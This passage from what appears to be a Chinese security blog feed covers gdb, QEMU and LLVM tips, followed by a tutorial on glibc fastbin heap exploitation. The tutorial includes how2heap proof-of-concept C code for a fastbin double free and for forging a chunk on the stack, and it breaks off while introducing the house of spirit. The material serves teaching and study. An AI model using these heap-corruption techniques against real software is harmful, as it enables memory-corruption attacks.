<h2 id="传进-libc-start-main函数的参数"><a href="#传进-libc-start-main函数的参数" class="headerlink" title="传进__libc_start_main函数的参数"></a>传进__libc_start_main函数的参数</h2><p>查看汇编可以看到将__libc_start_main的第一个参数传进了$RDI寄存器中（64位机器）：</p>
<p><img src="/2018/01/22/gdb无法定位main/main_address.png" alt="first_param"></p>
<p>因此在gdb中先在<strong>libc_start_main函数下断点: ```b </strong>libc_start_main```</p>
<h2 id="在-RDI指向的内容处下断点"><a href="#在-RDI指向的内容处下断点" class="headerlink" title="在$RDI指向的内容处下断点"></a>在$RDI指向的内容处下断点</h2><p>在 <strong>libc_start_main处下了断点后，run一下会在</strong>libc_start_main入口处停下，此时$rdi寄存器存储的是main函数的地址，<code>b *$rdi</code>则会在main处下断点</p>
<p><img src="/2018/01/22/gdb无法定位main/rdi.png" alt="rdi"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在用gdb调试一个程序的时候，由于程序经过了strip处理，没有debug信息，所以当b main的时候会出现”Function main not defined”错误信息，也就是无法定位main函数。而当b &lt;strong&gt;libc_start_main函数时是可以定
    
    </summary>
    
      <category term="gdb" scheme="http://bin2415.github.io/categories/gdb/"/>
    
    
      <category term="gdb" scheme="http://bin2415.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>Qemu模拟Mips程序运行</title>
    <link href="http://bin2415.github.io/2018/01/14/qemu-mips/"/>
    <id>http://bin2415.github.io/2018/01/14/qemu-mips/</id>
    <published>2018-01-14T12:15:22.000Z</published>
    <updated>2018-12-23T05:33:53.027Z</updated>
    
    <content type="html"><![CDATA[<p>使用Qemu可以运行不同环境的程序，比方说在i386架构下运行arm和mips架构的程序。</p>
<ul>
<li>安装Qemu<ul>
<li>sudo apt-get install qemu</li>
<li>sudo apt-get install qemu-user-static</li>
</ul>
</li>
<li>将qemu-mips-static文件拷贝到当前文件<ul>
<li>cp /usr/bin/qemu-mips-static ./</li>
</ul>
</li>
<li>运行mips程序(其中./bin/busybox为要执行的busybox)<ul>
<li>sudo chroot . ./qemu-mips-static ./bin/busybox</li>
</ul>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用Qemu可以运行不同环境的程序，比方说在i386架构下运行arm和mips架构的程序。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装Qemu&lt;ul&gt;
&lt;li&gt;sudo apt-get install qemu&lt;/li&gt;
&lt;li&gt;sudo apt-get install qemu-us
    
    </summary>
    
      <category term="qemu" scheme="http://bin2415.github.io/categories/qemu/"/>
    
    
      <category term="qemu" scheme="http://bin2415.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>llvm存取fs段内容</title>
    <link href="http://bin2415.github.io/2017/11/18/llvm%E5%AD%98%E5%8F%96fs%E6%AE%B5%E5%86%85%E5%AE%B9/"/>
    <id>http://bin2415.github.io/2017/11/18/llvm存取fs段内容/</id>
    <published>2017-11-18T02:26:29.000Z</published>
    <updated>2018-12-23T05:33:53.017Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近想使用llvm的pass来对每个函数进行插桩，来模拟stack guard的功能。其中碰到了一个很棘手的问题就是如何通过llvm C API实现对fs段内容的存取。要想实现该问题，我通过查看llvm如何实现stack guard,找到了具体的解决方案。下面首先看一下llvm中stackProtector pass如何实现对fs段的存取，然后再介绍一下我自己简化版本的Stack guard。</p>
<h2 id="stackProtector对fs段的存取"><a href="#stackProtector对fs段的存取" class="headerlink" title="stackProtector对fs段的存取"></a>stackProtector对fs段的存取</h2><p>在stackProtector中，调用getIRStackGuard(IRBuilder&lt;&gt; &amp;IRB) const函数对fs段进行存取的，其在x86下实现的具体代码如下:</p>
<p><img src="/2017/11/18/llvm存取fs段内容/fs_fetch.png" alt="fs_fetch"></p>
<p><img src="/2017/11/18/llvm存取fs段内容/fs_address.png" alt="fs_address"></p>
<p>其中fs段的addressSpace为257</p>
<h2 id="实现存取"><a href="#实现存取" class="headerlink" title="实现存取"></a>实现存取</h2><p>所以对fs段的存取代码如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Address为257表示在用户模式下的fs段寄存器</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> Constant* <span class="title">SegmentOffsetStack</span><span class="params">(IRBuilder&lt;&gt; &amp;IRB, <span class="keyword">unsigned</span> Offset, <span class="keyword">unsigned</span> AddressSpace)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ConstantExpr::getIntToPtr(</span><br><span class="line">		ConstantInt::get(Type::getInt32Ty(IRB.getContext()), Offset),</span><br><span class="line">		Type::getInt8PtrTy(IRB.getContext())-&gt;getPointerTo(AddressSpace)</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> Value* <span class="title">getTheStackGuardValue</span><span class="params">(IRBuilder&lt;&gt; &amp;IRB, <span class="keyword">unsigned</span> offset)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> SegmentOffsetStack(IRB, offset, <span class="number">257</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中offset为从fs段偏移offset处取数据。</p>
<p>下附我对stack guard的一个简单的实现:<br><a href="https://github.com/bin2415/llvm-stack-guard" target="_blank" rel="noopener">stackguard</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;最近想使用llvm的pass来对每个函数进行插桩，来模拟stack guard的功能。其中碰到了一个很棘手的问题就是如何通过llvm C A
    
    </summary>
    
      <category term="llvm" scheme="http://bin2415.github.io/categories/llvm/"/>
    
    
      <category term="llvm" scheme="http://bin2415.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>llvm生成rdrand指令</title>
    <link href="http://bin2415.github.io/2017/11/18/llvm-rdrand/"/>
    <id>http://bin2415.github.io/2017/11/18/llvm-rdrand/</id>
    <published>2017-11-18T01:27:03.000Z</published>
    <updated>2018-12-23T05:33:53.016Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在做一个project的时候需要使用llvm的pass对函数进行插桩，在每一个函数头之前插入一条指令rdrand %rax，在寻找llvm基本指令之后发现并没有生成随机数的指令，这时就想到了llvm中intrinsic函数中是否有关于rdrand指令的函数，在对llvm整个源码进行扫描之后，发现有x86的rdrand的intrinsic函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">X86_INTRINSIC_DATA(rdrand_16, RDRAND, X86ISD::RDRAND, <span class="number">0</span>),</span><br><span class="line">X86_INTRINSIC_DATA(rdrand_32, RDRAND, X86ISD::RDRAND, <span class="number">0</span>),</span><br><span class="line">X86_INTRINSIC_DATA(rdrand_64, RDRAND, X86ISD::RDRAND, <span class="number">0</span>),</span><br></pre></td></tr></table></figure>
<p>既然有对它们的定义，那是否有关于它们的使用呢，又经过一番查找，终于在一个测试文件中(/test/CodeGen/X86/rdrand.ll)找到相应的使用:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">declare &#123;i16, i32&#125; @llvm.x86.rdrand<span class="number">.16</span>()</span><br><span class="line">declare &#123;i32, i32&#125; @llvm.x86.rdrand<span class="number">.32</span>()</span><br><span class="line">declare &#123;i64, i32&#125; @llvm.x86.rdrand<span class="number">.64</span>()</span><br><span class="line"></span><br><span class="line">define i32 @_rdrand16_step(i16* %random_val) &#123;</span><br><span class="line">  %call = call &#123;i16, i32&#125; @llvm.x86.rdrand<span class="number">.16</span>()</span><br><span class="line">  %randval = extractvalue &#123;i16, i32&#125; %call, <span class="number">0</span></span><br><span class="line">  store i16 %randval, i16* %random_val</span><br><span class="line">  %isvalid = extractvalue &#123;i16, i32&#125; %call, <span class="number">1</span></span><br><span class="line">  ret i32 %isvalid</span><br><span class="line">; CHECK-LABEL: _rdrand16_step:</span><br><span class="line">; CHECK: rdrandw	%ax</span><br><span class="line">; CHECK: movzwl	%ax, %ecx</span><br><span class="line">; CHECK: movl	$<span class="number">1</span>, %eax</span><br><span class="line">; CHECK: cmovael	%ecx, %eax</span><br><span class="line">; CHECK: movw	%cx, (%r[[A0:di|cx]])</span><br><span class="line">; CHECK: ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define i32 @_rdrand32_step(i32* %random_val) &#123;</span><br><span class="line">  %call = call &#123;i32, i32&#125; @llvm.x86.rdrand<span class="number">.32</span>()</span><br><span class="line">  %randval = extractvalue &#123;i32, i32&#125; %call, <span class="number">0</span></span><br><span class="line">  store i32 %randval, i32* %random_val</span><br><span class="line">  %isvalid = extractvalue &#123;i32, i32&#125; %call, <span class="number">1</span></span><br><span class="line">  ret i32 %isvalid</span><br><span class="line">; CHECK-LABEL: _rdrand32_step:</span><br><span class="line">; CHECK: rdrandl	%e[[T0:[a-z]+]]</span><br><span class="line">; CHECK: movl	$<span class="number">1</span>, %eax</span><br><span class="line">; CHECK: cmovael	%e[[T0]], %eax</span><br><span class="line">; CHECK: movl	%e[[T0]], (%r[[A0]])</span><br><span class="line">; CHECK: ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define i32 @_rdrand64_step(i64* %random_val) &#123;</span><br><span class="line">  %call = call &#123;i64, i32&#125; @llvm.x86.rdrand<span class="number">.64</span>()</span><br><span class="line">  %randval = extractvalue &#123;i64, i32&#125; %call, <span class="number">0</span></span><br><span class="line">  store i64 %randval, i64* %random_val</span><br><span class="line">  %isvalid = extractvalue &#123;i64, i32&#125; %call, <span class="number">1</span></span><br><span class="line">  ret i32 %isvalid</span><br><span class="line">; CHECK-LABEL: _rdrand64_step:</span><br><span class="line">; CHECK: rdrandq	%r[[T1:[a-z]+]]</span><br><span class="line">; CHECK: movl	$<span class="number">1</span>, %eax</span><br><span class="line">; CHECK: cmovael	%e[[T1]], %eax</span><br><span class="line">; CHECK: movq	%r[[T1]], (%r[[A0]])</span><br><span class="line">; CHECK: ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个系列函数是对rdrandx_step(address)系列函数的包装，在这些函数中是生成随机数，并将该随机数保存到address参数中。发现在该系列函数中对@llvm.x86.rdrand.xx()系列函数的调用，可以发现，在该函数第一个语句是对@llvm.x86.rdrand.xx() intrinsic函数的调用，该函数返回一个StructType类型的结果，该结果一共有两个成员组成，第一个成员是@llvm.x86.rdrand.xx()函数产生的随机数，第二个参数表示该函数是否调用成功。第二个语句就是从结果中取出随机数。弄清了该函数的逻辑后就可以通过llvm C API产生相应的IR指令。</p>
<h2 id="llvm-C-API"><a href="#llvm-C-API" class="headerlink" title="llvm C API"></a>llvm C API</h2><p>下面是我通过llvm的C API产生的相应的IR指令的代码:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AllocaInst* AI3 = B.CreateAlloca(PtrTy, <span class="literal">nullptr</span>, <span class="string">"RandomValue"</span>);</span><br><span class="line">	</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Type *&gt; arg_type;</span><br><span class="line">	</span><br><span class="line">Function *fun = Intrinsic::getDeclaration(F-&gt;getParent(), Intrinsic::x86_rdrand_64, arg_type);</span><br><span class="line">CallInst* result = B.CreateCall(fun, &#123;&#125;);</span><br><span class="line">	<span class="comment">//B.CreateRet(result);</span></span><br><span class="line">	<span class="comment">//result-&gt;dump();</span></span><br><span class="line"><span class="keyword">if</span> (dyn_cast&lt;StructType&gt;(result-&gt;getType())) &#123;</span><br><span class="line">		<span class="comment">//errs() &lt;&lt; "Hello\n";</span></span><br><span class="line">	Value* randomValue = B.CreateExtractValue(result, (<span class="keyword">uint64_t</span>)<span class="number">0</span>);</span><br><span class="line">	Value* randomValuePtr = B.CreateIntToPtr(randomValue, Type::getInt8PtrTy(B.getContext()));</span><br><span class="line">	B.CreateStore(randomValuePtr, AI3, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在生成了.ll文件后，需要用llc工具生成二进制文件，此时需要添加-mattr=rdrnd的属性:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc -filetype=obj input.ll -mattr=+rdrnd -o output.o</span><br></pre></td></tr></table></figure>
<p>否则会出现LLVM ERROR: Cannot select: t74: i64,i32,ch = X86ISD::RDRAND t0错误</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;在做一个project的时候需要使用llvm的pass对函数进行插桩，在每一个函数头之前插入一条指令rdrand %rax，在寻找llvm基
    
    </summary>
    
      <category term="llvm" scheme="http://bin2415.github.io/categories/llvm/"/>
    
    
      <category term="llvm" scheme="http://bin2415.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>linux堆内存漏洞利用之fastbin</title>
    <link href="http://bin2415.github.io/2017/09/24/linux%E5%A0%86%E5%86%85%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/"/>
    <id>http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/</id>
    <published>2017-09-24T02:14:15.000Z</published>
    <updated>2018-12-23T05:33:53.013Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>  在<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="noopener">前一节</a>主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:</p>
<ul>
<li>fastbin的攻击</li>
<li>smallbin的攻击</li>
<li>largebin的攻击</li>
<li>unsorted bin的攻击</li>
<li><p>top chunk的攻击</p>
<p>本文主要介绍fastbin的攻击</p>
</li>
</ul>
<h2 id="fastbin漏洞利用"><a href="#fastbin漏洞利用" class="headerlink" title="fastbin漏洞利用"></a>fastbin漏洞利用</h2><p>  具体的fastbin的介绍请参考<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="noopener">前一节</a>和 <a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.36f39d7ebNe83t&amp;articleid=334" target="_blank" rel="noopener">Linux堆内存管理深入分析(下)</a>，在本节中主要结合<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>的代码来介绍一下具体的漏洞利用思路。</p>
<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p>  double free的意思就是一个malloc的指针被释放了两次，由于针对fastbin的free处理只是对double free做了简单的判断，所以很容易绕过它的double free判断。free() fastbin时的判断如下所示：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">	   (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<p>  其中old指针为fast bin的头指针，即此处只是判断fastbin的头指针和p指针是否一致。所以fastbin double free的攻击思路就是我们只要保证要double free的chunk不在fastbin的头部即可。</p>
<p>  具体的攻击示例如下：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  在此示例中，首先申请三个大小为8的int数组，然后先free(a),由于fast bin是一个单链表，在插入和删除的时候只在头部进行，所以此时将a的chunk放入了fast bin的头部，随后又free(b),此时fast bin的头部为chunk b，随后又free(a)，此时由于fast bin的头部为chunk b，所以在free()的时候进行判断old == p不会抛出错误进而绕过这个简单的判断处理。再进行malloc的时候首先会从fast bin的头部进行删除，则接下来第一个分配的chunk为chunk A，第二个分配的为chunk B，接下来会再次分配chunk A。</p>
<p>  绕过示例结果如下所示:</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png" alt="fast bin dup"></p>
<h3 id="fast-bin-double-free-in-stack"><a href="#fast-bin-double-free-in-stack" class="headerlink" title="fast bin double free in stack"></a>fast bin double free in stack</h3><p>  上面的那个例子只是简单的一个double free，这个例子是利用double free漏洞在栈中构造了一个fake chunk。<br>  其具体的示例如下所示:</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  在以上代码中，当d被malloc的时候，此时还有对应的chunk a在fast bin中，所以如果对d进行修改，也会影响到chunk a的值。我们知道malloced chunk和freed chunk对应的结构不一样，对与同一个chunk A来说，有两种形式–对于d来说，其对应的是malloced chunk，而其在fast bin中还有一个freed chunk。<br>  其示例如图所示：</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack_pic.png" alt="fast bin stack pin"></p>
<p>  可以看到<em>d(payload开始地址)正好对应了chunk A的fd指针，将 </em>d的值赋值为&amp;stack_var-8,则 stack_var=0x20即为在栈中伪造的chunk的size=0x20，与此fast bin的大小对应，此时chunk A的fd指向了在栈中伪造的chunk，此时就将伪造的chunk放入了fastbin链表中。进而malloc可以返回伪造的指针。</p>
<p>  该示例代码的运行结果如下所示：</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack.png" alt="fast bin stack"></p>
<h3 id="The-house-of-spirit"><a href="#The-house-of-spirit" class="headerlink" title="The house of spirit"></a>The house of spirit</h3><p>  此攻击也是在栈中伪造fake chunk，和第二个攻击不同的是其只是在栈中声明了一个指针，而并没有通过malloc()函数来在堆中申请空间，接着将该指针赋值为特定的伪造的chunk的地址，随后free该指针，就将在栈中伪造的chunk添加到对应的fastbin中去了。具体的示例如下所示:</p>
